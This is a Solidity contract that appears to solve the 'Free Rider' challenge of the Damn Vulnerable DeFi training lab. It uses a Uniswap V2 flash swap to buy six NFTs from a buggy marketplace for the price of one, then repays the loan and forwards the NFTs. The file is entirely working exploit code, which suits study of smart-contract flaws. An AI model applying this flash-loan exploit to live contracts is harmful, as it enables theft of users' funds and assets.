// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import "./FreeRiderNFTMarketplace.sol";
import "../DamnValuableNFT.sol";

interface IWETH9 {
    function balanceOf(address) external returns (uint256);

    function deposit() external payable;

    function withdraw(uint256 wad) external;

    function transfer(address dst, uint256 wad) external returns (bool);
}

contract Attacker {
    IUniswapV2Factory factory;
    IUniswapV2Pair pair;
    IWETH9 weth;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT dvn;

    address buyer;

    uint256[] tokenIds = [0, 1, 2, 3, 4, 5];

    constructor(
        address factory_,
        address weth_,
        address dvt,
        address payable marketplace_,
        address dvn_,
        address buyer_
    ) {
        factory = IUniswapV2Factory(factory_);
        pair = IUniswapV2Pair(factory.getPair(weth_, dvt));
        weth = IWETH9(weth_);
        marketplace = FreeRiderNFTMarketplace(marketplace_);
        dvn = DamnValuableNFT(dvn_);
        buyer = buyer_;
    }

    function attack() external {
        bytes memory data = abi.encode(address(this));
        pair.swap(15 * 10**18, 0, address(this), data);
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256,
        bytes calldata
    ) external {
        weth.withdraw(amount0);
        marketplace.buyMany{value: amount0}(tokenIds);
        weth.deposit{value: sender.balance}();
        uint256 balance = weth.balanceOf(sender);
        weth.transfer(address(pair), balance);
        for (uint256 i = 0; i < 6; i++) {
            dvn.safeTransferFrom(address(this), buyer, i);
        }
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
